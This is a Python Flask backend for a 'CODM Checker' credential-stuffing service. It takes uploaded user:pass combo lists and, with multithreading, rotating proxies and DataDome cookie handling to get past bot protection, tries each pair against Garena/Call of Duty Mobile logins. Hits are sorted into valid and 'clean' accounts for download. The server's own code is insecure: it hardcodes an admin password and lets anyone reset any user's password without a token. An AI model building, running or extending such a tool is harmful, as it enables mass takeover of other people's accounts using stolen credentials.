import os
import sys
import time
import uuid
import threading
import zipfile
import traceback
import sqlite3
import bcrypt
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import wraps
from flask import Flask, request, jsonify, session, g
from flask_cors import CORS

BASE = Path(__file__).resolve().parent
os.chdir(BASE)
sys.path.insert(0, str(BASE))

import requests
from codm_checker import (
    CookieManager, DataDomeManager, ResultsManager,
    processaccount, LiveStats, AccountFileManager,
    init_ga_cookies, get_datadome_cookie, applyck,
)

try:
    from codm_checker import ProxyManager
except Exception:
    ProxyManager = None

app = Flask(__name__)
app.secret_key = os.urandom(24).hex()  # CHANGE THIS IN PRODUCTION
CORS(app, supports_credentials=True, origins=["*"])  # Restrict origins in production

app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024

UPLOAD = BASE / "uploads"
RESULTS = BASE / "results"
UPLOAD.mkdir(exist_ok=True)
RESULTS.mkdir(exist_ok=True)

# ---------- Database ----------
DB_PATH = BASE / "checker.db"

def get_db():
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            email TEXT UNIQUE NOT NULL,
            is_admin INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS cookies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cookie_string TEXT NOT NULL,
            active INTEGER DEFAULT 1,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            used_count INTEGER DEFAULT 0
        )
    ''')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS proxies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            proxy_string TEXT NOT NULL,
            active INTEGER DEFAULT 1,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            used_count INTEGER DEFAULT 0
        )
    ''')
    admin = conn.execute("SELECT * FROM users WHERE username='admin'").fetchone()
    if not admin:
        hashed = bcrypt.hashpw(b'kenjibns', bcrypt.gensalt())
        conn.execute("INSERT INTO users (username, password_hash, email, is_admin) VALUES (?, ?, ?, ?)",
                     ('admin', hashed, 'admin@example.com', 1))
    conn.commit()
    conn.close()
init_db()

# ---------- Auth helpers ----------
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({"error": "Unauthorized"}), 401
        conn = get_db()
        user = conn.execute("SELECT is_admin FROM users WHERE id=?", (session['user_id'],)).fetchone()
        conn.close()
        if not user or not user['is_admin']:
            return jsonify({"error": "Forbidden"}), 403
        return f(*args, **kwargs)
    return decorated

# ---------- Auth API ----------
@app.route('/api/signup', methods=['POST'])
def api_signup():
    data = request.get_json()
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()
    email = data.get('email', '').strip()
    if not username or not password or not email:
        return jsonify({"error": "All fields required"}), 400
    if len(password) < 6:
        return jsonify({"error": "Password too short"}), 400
    hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
    conn = get_db()
    try:
        conn.execute("INSERT INTO users (username, password_hash, email) VALUES (?, ?, ?)",
                     (username, hashed, email))
        conn.commit()
        conn.close()
        return jsonify({"ok": True, "message": "Account created"}), 201
    except sqlite3.IntegrityError:
        conn.close()
        return jsonify({"error": "Username or email already exists"}), 400

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json()
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE username=?", (username,)).fetchone()
    conn.close()
    if user and bcrypt.checkpw(password.encode('utf-8'), user['password_hash']):
        session['user_id'] = user['id']
        session['username'] = user['username']
        session['is_admin'] = bool(user['is_admin'])
        return jsonify({"ok": True, "username": user['username'], "is_admin": session['is_admin']})
    return jsonify({"error": "Invalid credentials"}), 401

@app.route('/api/logout', methods=['POST'])
def api_logout():
    session.clear()
    return jsonify({"ok": True})

@app.route('/api/recover', methods=['POST'])
def api_recover():
    data = request.get_json()
    email = data.get('email', '').strip()
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE email=?", (email,)).fetchone()
    conn.close()
    if user:
        # In production, send email with reset link. For demo, return user_id.
        return jsonify({"ok": True, "message": "Reset link sent", "user_id": user['id']})
    return jsonify({"error": "Email not found"}), 404

@app.route('/api/reset/<int:user_id>', methods=['POST'])
def api_reset(user_id):
    data = request.get_json()
    password = data.get('password', '').strip()
    if len(password) < 6:
        return jsonify({"error": "Too short"}), 400
    hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
    conn = get_db()
    conn.execute("UPDATE users SET password_hash=? WHERE id=?", (hashed, user_id))
    conn.commit()
    conn.close()
    return jsonify({"ok": True, "message": "Password updated"})

@app.route('/api/session', methods=['GET'])
def api_session():
    if 'user_id' in session:
        return jsonify({"logged_in": True, "username": session.get('username'), "is_admin": session.get('is_admin', False)})
    return jsonify({"logged_in": False})

# ---------- Admin API ----------
@app.route('/api/admin/cookies', methods=['GET'])
@admin_required
def api_admin_cookies():
    conn = get_db()
    cookies = conn.execute("SELECT * FROM cookies ORDER BY id DESC").fetchall()
    conn.close()
    return jsonify([dict(row) for row in cookies])

@app.route('/api/admin/cookie/add', methods=['POST'])
@admin_required
def api_add_cookie():
    data = request.get_json()
    cookie = data.get('cookie', '').strip()
    if not cookie:
        return jsonify({"error": "Cookie required"}), 400
    conn = get_db()
    conn.execute("INSERT INTO cookies (cookie_string) VALUES (?)", (cookie,))
    conn.commit()
    conn.close()
    return jsonify({"ok": True})

@app.route('/api/admin/cookie/toggle/<int:cookie_id>', methods=['POST'])
@admin_required
def api_toggle_cookie(cookie_id):
    conn = get_db()
    cur = conn.execute("SELECT active FROM cookies WHERE id=?", (cookie_id,))
    row = cur.fetchone()
    if not row:
        conn.close()
        return jsonify({"error": "Not found"}), 404
    new = 0 if row['active'] else 1
    conn.execute("UPDATE cookies SET active=? WHERE id=?", (new, cookie_id))
    conn.commit()
    conn.close()
    return jsonify({"ok": True})

@app.route('/api/admin/cookie/delete/<int:cookie_id>', methods=['POST'])
@admin_required
def api_delete_cookie(cookie_id):
    conn = get_db()
    conn.execute("DELETE FROM cookies WHERE id=?", (cookie_id,))
    conn.commit()
    conn.close()
    return jsonify({"ok": True})

@app.route('/api/admin/proxies', methods=['GET'])
@admin_required
def api_admin_proxies():
    conn = get_db()
    proxies = conn.execute("SELECT * FROM proxies ORDER BY id DESC").fetchall()
    conn.close()
    return jsonify([dict(row) for row in proxies])

@app.route('/api/admin/proxy/add', methods=['POST'])
@admin_required
def api_add_proxy():
    data = request.get_json()
    proxy = data.get('proxy', '').strip()
    if not proxy:
        return jsonify({"error": "Proxy required"}), 400
    conn = get_db()
    conn.execute("INSERT INTO proxies (proxy_string) VALUES (?)", (proxy,))
    conn.commit()
    conn.close()
    return jsonify({"ok": True})

@app.route('/api/admin/proxy/toggle/<int:proxy_id>', methods=['POST'])
@admin_required
def api_toggle_proxy(proxy_id):
    conn = get_db()
    cur = conn.execute("SELECT active FROM proxies WHERE id=?", (proxy_id,))
    row = cur.fetchone()
    if not row:
        conn.close()
        return jsonify({"error": "Not found"}), 404
    new = 0 if row['active'] else 1
    conn.execute("UPDATE proxies SET active=? WHERE id=?", (new, proxy_id))
    conn.commit()
    conn.close()
    return jsonify({"ok": True})

@app.route('/api/admin/proxy/delete/<int:proxy_id>', methods=['POST'])
@admin_required
def api_delete_proxy(proxy_id):
    conn = get_db()
    conn.execute("DELETE FROM proxies WHERE id=?", (proxy_id,))
    conn.commit()
    conn.close()
    return jsonify({"ok": True})

@app.route('/api/admin/users', methods=['GET'])
@admin_required
def api_admin_users():
    conn = get_db()
    users = conn.execute("SELECT id, username, email, is_admin, created_at FROM users").fetchall()
    conn.close()
    return jsonify([dict(row) for row in users])

# ---------- Checker logic ----------
jobs = {}
jobs_lock = threading.Lock()

class Job:
    def __init__(self, job_id, combo_path, threads=6, use_proxy=True):
        self.job_id = job_id
        self.combo_path = Path(combo_path)
        self.threads = max(1, min(int(threads), 30))
        self.use_proxy = use_proxy
        self.status = "idle"
        self.total = 0
        self.done = 0
        self.valid = 0
        self.invalid = 0
        self.clean = 0
        self.not_clean = 0
        self.has_codm = 0
        self.errors = 0
        self.started_at = None
        self.finished_at = None
        self.stop_event = threading.Event()
        self.log = []
        self.log_lock = threading.Lock()
        self.result_dir = None
        self.error_msg = None

    def add_log(self, msg):
        with self.log_lock:
            ts = datetime.now().strftime("%H:%M:%S")
            self.log.append(f"[{ts}] {msg}")
            if len(self.log) > 400:
                self.log = self.log[-400:]

    def to_dict(self):
        elapsed = 0
        if self.started_at:
            end = self.finished_at or time.time()
            elapsed = end - self.started_at
        rate = (self.done / elapsed) if elapsed > 0 else 0
        with self.log_lock:
            recent = list(self.log[-50:])
        return {
            "job_id": self.job_id,
            "status": self.status,
            "total": self.total,
            "done": self.done,
            "valid": self.valid,
            "invalid": self.invalid,
            "clean": self.clean,
            "not_clean": self.not_clean,
            "has_codm": self.has_codm,
            "errors": self.errors,
            "elapsed": round(elapsed, 1),
            "rate": round(rate, 2),
            "log": recent,
            "error_msg": self.error_msg,
            "has_results": bool(self.result_dir and Path(self.result_dir).exists()),
        }

def _load_accounts(path):
    accounts, seen = [], set()
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or ":" not in line or line in seen:
                continue
            seen.add(line)
            a, p = line.split(":", 1)
            a, p = a.strip(), p.strip()
            if a and p:
                accounts.append((a, p, line))
    return accounts

def get_active_cookies():
    conn = get_db()
    rows = conn.execute("SELECT cookie_string FROM cookies WHERE active=1").fetchall()
    conn.close()
    return [row['cookie_string'] for row in rows]

def get_active_proxies():
    conn = get_db()
    rows = conn.execute("SELECT proxy_string FROM proxies WHERE active=1").fetchall()
    conn.close()
    return [row['proxy_string'] for row in rows]

def _run_job(job: Job):
    try:
        job.status = "running"
        job.started_at = time.time()
        job.add_log(f"Started · threads={job.threads} · proxy={job.use_proxy}")

        accounts = _load_accounts(job.combo_path)
        job.total = len(accounts)
        job.add_log(f"Loaded {job.total} accounts")
        if job.total == 0:
            job.status = "error"
            job.error_msg = "No valid user:pass lines"
            job.finished_at = time.time()
            return

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_dir = RESULTS / f"job_{job.job_id}_{ts}"
        result_dir.mkdir(parents=True, exist_ok=True)
        job.result_dir = str(result_dir)

        # Use cookies from DB
        cookie_manager = CookieManager()
        db_cookies = get_active_cookies()
        for c in db_cookies:
            cookie_manager.add_cookie(c)
        live_stats = LiveStats()
        live_stats.total_accounts = job.total
        results_manager = ResultsManager(str(job.combo_path), create_dirs=True)
        results_manager.base_dir = result_dir
        for sub in ("Country", "Level", "Garena Shells"):
            (result_dir / sub).mkdir(parents=True, exist_ok=True)

        file_manager = AccountFileManager(combo_folder=str(UPLOAD))
        auto_remove = False

        proxy_manager = None
        using_proxy = False
        if job.use_proxy:
            db_proxies = get_active_proxies()
            if db_proxies:
                class DummyProxyManager:
                    def __init__(self, proxies):
                        self.proxies = proxies
                        self.enabled = True
                        self.idx = 0
                    def get_next(self):
                        if not self.proxies:
                            return None
                        proxy = self.proxies[self.idx % len(self.proxies)]
                        self.idx += 1
                        parts = proxy.split(':')
                        if len(parts) >= 4:
                            return {'http': f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}",
                                    'https': f"https://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"}
                        return None
                proxy_manager = DummyProxyManager(db_proxies)
                using_proxy = True
                job.add_log(f"Proxies loaded from DB: {len(db_proxies)}")

        tls = threading.local()

        def get_resources():
            if not hasattr(tls, "session"):
                tls.session = requests.Session()
                tls.datadome = DataDomeManager()
                if using_proxy and proxy_manager:
                    proxy = proxy_manager.get_next()
                    if proxy:
                        tls.session.proxies.update(proxy)
                valid = cookie_manager.get_valid_cookies()
                if valid:
                    applyck(tls.session, "; ".join(valid))
                    for part in valid[-1].split(";"):
                        part = part.strip()
                        if part.startswith("datadome="):
                            tls.datadome.set_datadome(part.split("=", 1)[1].strip())
                            break
                else:
                    dd = get_datadome_cookie(tls.session)
                    if dd:
                        tls.datadome.set_datadome(dd)
            return tls.session, tls.datadome

        def worker(item):
            if job.stop_event.is_set():
                return "STOPPED"
            account, password, _raw = item
            try:
                session, dm = get_resources()
                status = processaccount(
                    session, account, password,
                    cookie_manager, dm,
                    live_stats, results_manager,
                    file_manager, str(job.combo_path),
                    auto_remove,
                    use_elegant_display=False,
                    suppress_print=True,
                    proxy_manager=proxy_manager if using_proxy else None,
                )
                return status or "DONE"
            except Exception as e:
                return f"ERROR:{e}"

        with ThreadPoolExecutor(max_workers=job.threads) as ex:
            futs = {ex.submit(worker, it): it for it in accounts}
            for fut in as_completed(futs):
                if job.stop_event.is_set():
                    for f in futs:
                        f.cancel()
                    break
                item = futs[fut]
                account = item[0]
                try:
                    status = fut.result()
                except Exception as e:
                    status = f"ERROR:{e}"

                job.done += 1
                try:
                    s = live_stats.get_stats() if hasattr(live_stats, "get_stats") else {}
                    job.valid = s.get("valid", job.valid)
                    job.clean = s.get("clean", job.clean)
                    job.not_clean = s.get("not_clean", job.not_clean)
                    job.has_codm = s.get("has_codm", job.has_codm)
                    job.errors = s.get("error", job.errors)
                    job.invalid = max(0, job.done - job.valid - job.errors)
                except Exception:
                    pass

                if isinstance(status, str) and status.startswith("ERROR"):
                    job.errors += 1
                    job.add_log(f"✖ {account} · {status[:90]}")
                elif status == "STOPPED":
                    break
                else:
                    job.add_log(f"· {account} · {status}")

        # Aggregated results
        all_path = result_dir / "all_results.txt"
        chunks = []
        for fp in result_dir.rglob("*.txt"):
            try:
                c = fp.read_text(encoding="utf-8", errors="replace")
                if c.strip():
                    chunks.append(f"===== {fp.name} =====\n{c}\n")
            except Exception:
                pass
        all_path.write_text("\n".join(chunks) if chunks else "No detailed results.\n", encoding="utf-8")

        for pattern, dest in [
            ("All_Accounts_*.txt", "all_accounts.txt"),
            ("Valid_Accounts_*.txt", "valid_accounts.txt"),
            ("Clean_Accounts_*.txt", "clean_accounts.txt"),
            ("Not_Clean_Accounts_*.txt", "not_clean_accounts.txt"),
            ("NO_CODM_Accounts_*.txt", "no_codm_accounts.txt"),
        ]:
            matches = list(result_dir.glob(pattern))
            if matches:
                try:
                    (result_dir / dest).write_text(
                        matches[0].read_text(encoding="utf-8", errors="replace"),
                        encoding="utf-8",
                    )
                except Exception:
                    pass

        if job.stop_event.is_set():
            job.status = "stopped"
            job.add_log("Stopped")
        else:
            job.status = "finished"
            job.add_log(f"Finished · {job.done}/{job.total}")
        job.finished_at = time.time()
    except Exception as e:
        job.status = "error"
        job.error_msg = str(e)
        job.finished_at = time.time()
        job.add_log(f"FATAL: {e}")
        traceback.print_exc()

# ---------- Checker API endpoints ----------
@app.route('/api/start', methods=['POST'])
@login_required
def api_start():
    if "file" not in request.files:
        return jsonify({"ok": False, "error": "No file"}), 400
    f = request.files["file"]
    if not f.filename:
        return jsonify({"ok": False, "error": "Empty filename"}), 400
    threads = request.form.get("threads", "6")
    use_proxy = request.form.get("use_proxy", "1") == "1"
    job_id = uuid.uuid4().hex[:12]
    path = UPLOAD / f"{job_id}.txt"
    f.save(path)
    job = Job(job_id, path, threads=threads, use_proxy=use_proxy)
    with jobs_lock:
        jobs[job_id] = job
    threading.Thread(target=_run_job, args=(job,), daemon=True).start()
    return jsonify({"ok": True, "job_id": job_id})

@app.route('/api/status/<job_id>')
@login_required
def api_status(job_id):
    with jobs_lock:
        job = jobs.get(job_id)
    if not job:
        return jsonify({"ok": False, "error": "not found"}), 404
    return jsonify({"ok": True, **job.to_dict()})

@app.route('/api/stop/<job_id>', methods=['POST'])
@login_required
def api_stop(job_id):
    with jobs_lock:
        job = jobs.get(job_id)
    if not job:
        return jsonify({"ok": False, "error": "not found"}), 404
    job.stop_event.set()
    job.add_log("Stop requested")
    return jsonify({"ok": True})

@app.route('/api/download/<job_id>')
@login_required
def api_download(job_id):
    with jobs_lock:
        job = jobs.get(job_id)
    if not job or not job.result_dir:
        return jsonify({"ok": False, "error": "no results"}), 404
    result_dir = Path(job.result_dir)
    if not result_dir.exists():
        return jsonify({"ok": False, "error": "missing"}), 404
    zip_path = result_dir.parent / f"results_{job_id}.zip"
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for fp in result_dir.rglob("*"):
            if fp.is_file():
                zf.write(fp, arcname=str(fp.relative_to(result_dir)))
    return send_file(zip_path, as_attachment=True, download_name=f"codm_results_{job_id}.zip")

@app.route('/api/download_txt/<job_id>')
@login_required
def api_download_txt(job_id):
    with jobs_lock:
        job = jobs.get(job_id)
    if not job or not job.result_dir:
        return jsonify({"ok": False, "error": "no results"}), 404
    p = Path(job.result_dir) / "all_results.txt"
    if not p.exists():
        matches = list(Path(job.result_dir).glob("All_Accounts_*.txt"))
        if matches:
            p = matches[0]
        else:
            return jsonify({"ok": False, "error": "no file"}), 404
    return send_file(p, as_attachment=True, download_name=f"codm_full_{job_id}.txt")

# Import send_file from flask
from flask import send_file

if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5050"))
    print("")
    print("  CODM Checker API")
    print(f"  Running on port {port}")
    print("  Crafted By Xyto ")
    print(" SD On Top ")
    app.run(host="0.0.0.0", port=port, debug=False)